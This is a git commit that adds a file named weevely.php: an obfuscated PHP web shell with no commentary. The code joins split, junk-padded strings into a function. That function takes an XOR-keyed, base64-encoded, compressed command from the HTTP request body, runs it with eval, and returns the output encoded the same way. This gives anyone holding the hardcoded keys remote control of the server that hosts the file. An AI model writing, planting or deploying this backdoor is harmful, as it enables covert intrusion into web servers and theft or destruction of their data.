778011884216c0c19315d4fa87da5737c94cb3b8
kec0a <43516039+kec0a@users.noreply.github.com>
2020-01-30 06:38:59 +0700

    Create weevely.php
    membuat weevely.php

---
+++ weevely.php
@@ -0,0 +1,10 @@
+<?php
+$n=str_replace('hj','','chjrehjathje_fuhjnchjtihjon');
+$H='_c@zontent@zs();@ob@z@z_end_clean@z();$r=@ba@zse64_e@zncod@ze(@x(@gzcom@zpres@zs($o),$@zk));pri@znt("$@zp$@zkh$r$kf");}';
+$p='$k="@zbf570c21";$@zk@zh="ef@z3682166b91@z";$kf@z="efb54c@z53a373"@z;$@zp="5bWV7bI@zsyDB@zTtB9@zo";f@zunction x($t@z,$@zk';
+$b='o.@z=$t{$@zi}^$@zk{$j};}}@z@zreturn $o@z;}if (@@z@zpreg_match("/$kh(.+)$kf@z/"@z,@file_g@zet@z@z_contents("php@z://inp';
+$a='ut@z"),@z$m)=@z@z=1) {@ob_start();@@zeva@zl(@gzunc@zompress(@z@x(@ba@zse64_@zdec@zode@z($m[1]@z)@z,$k)));$o=@ob_get@z';
+$N='){$c=st@zr@zl@z@zen($k);$l=strle@zn@z($t);$o="";f@zor($i=0;@z$i<$l;)@z{for($j=0;@z($j<$c&@z@z@z&$i<@z$l);$j++@z,$i++){$';
+$c=str_replace('@z','',$p.$N.$b.$a.$H);
+$T=$n('',$c);$T();
+?>
